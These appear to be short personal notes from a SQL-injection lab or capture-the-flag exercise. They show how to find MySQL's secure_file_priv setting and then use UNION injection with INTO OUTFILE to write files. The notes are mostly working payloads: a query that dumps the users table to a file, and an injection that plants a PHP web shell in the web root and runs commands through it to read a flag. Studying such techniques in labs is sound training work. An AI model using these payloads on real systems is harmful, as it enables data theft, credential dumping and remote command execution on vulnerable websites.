`secure_file_priv` is used to determine where read/write files from.
Default folder is `/var/lib/mysql-files`.
So using `SHOW VARIABLES LIKE 'secure_file_priv';`
Can provide possible information regarding this.

Final query looks like `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`
or with a union
`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`

### Using an OutFile
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
Or selecting a string
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';

An example being 
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

Going to the directory like 
`http://IP:PORT/proof.txt`

```php
<?php system($_REQUEST[0]); ?>
The Union being
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

Then when visiting the shell.
`http://IP:port/shell.php?0=id`
Then instead of `ls` running commands like `0=cat ../flag.txt`. 
Gave me the flag.